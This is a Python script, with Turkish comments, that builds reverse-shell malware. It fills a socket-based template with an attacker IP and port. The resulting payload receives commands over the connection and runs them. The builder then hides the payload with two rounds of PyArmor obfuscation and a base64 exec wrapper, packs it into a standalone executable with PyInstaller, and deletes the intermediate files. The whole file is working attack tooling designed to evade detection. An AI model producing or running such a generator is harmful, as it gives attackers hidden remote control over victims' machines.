import os
import base64
import sys
import shutil  # Dizinleri silmek için kullanılır

# Reverse shell template
reverse_shell_template = """
import socket
import subprocess
import os

attacker_ip = "{attacker_ip}"
attacker_port = {attacker_port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break

    if command.startswith("cd "):
        os.chdir(command[3:])
        output = os.getcwd()
    else:
        output = subprocess.getoutput(command)

    s.send(output.encode("utf-8"))

s.close()
"""

def generate_reverse_shell(ip, port):
    return reverse_shell_template.format(attacker_ip=ip, attacker_port=int(port))

def save_and_obfuscate(script_content):
    script_path = "reverse_shell.py"
    
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script_content)
    
    # PyArmor komutunu çalıştırma
    os.system(f"pyarmor gen -O dist {script_path}")
    
    obfuscated_path = os.path.join("dist", "reverse_shell.py")
    if not os.path.exists(obfuscated_path):
        print(f"Error: {obfuscated_path} not found after obfuscation.")
        sys.exit(1)
    
    return obfuscated_path

def encode_and_obfuscate(script_path):
    with open(script_path, "rb") as f:
        encoded_content = base64.b64encode(f.read()).decode('utf-8')

    encoded_script_path = os.path.join("dist", "encoded_shell.py")
    
    with open(encoded_script_path, "w", encoding="utf-8") as f:
        f.write(f'import base64\nexec(base64.b64decode("{encoded_content}"))')
    
    # PyArmor komutunu çalıştırma
    os.system(f"pyarmor gen -O dist {encoded_script_path}")
    
    final_obfuscated_path = os.path.join("dist", "encoded_shell.py")
    if not os.path.exists(final_obfuscated_path):
        print(f"Error: {final_obfuscated_path} not found after obfuscation.")
        sys.exit(1)
    
    return final_obfuscated_path

def package_into_executable(script_path):
    os.system(f"pyinstaller --onefile {script_path}")

def clean_up():
    # Dosyaları ve dizinleri silme
    files_to_delete = [
        "reverse_shell.py",
        "dist/reverse_shell.py",
        "dist/encoded_shell.py",
        "dist/reverse_shell_obfuscated.exe",
        "dist/reverse_shell_obfuscated.spec"
    ]
    
    for file in files_to_delete:
        if os.path.exists(file):
            if os.path.isdir(file):
                shutil.rmtree(file)  # Dizinleri ve içeriğini silme
            else:
                os.remove(file)  # Dosyaları silme
    
    # Dizinleri temizle
    if os.path.isdir("dist/build"):
        shutil.rmtree("dist/build")

def main(ip, port):
    script_content = generate_reverse_shell(ip, port)
    obfuscated_path = save_and_obfuscate(script_content)
    final_obfuscated_path = encode_and_obfuscate(obfuscated_path)
    package_into_executable(final_obfuscated_path)
    print("Executable created successfully!")
    clean_up()  

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <attacker_ip> <port>")
    else:
        attacker_ip = sys.argv[1]
        attacker_port = sys.argv[2]
        main(attacker_ip, attacker_port)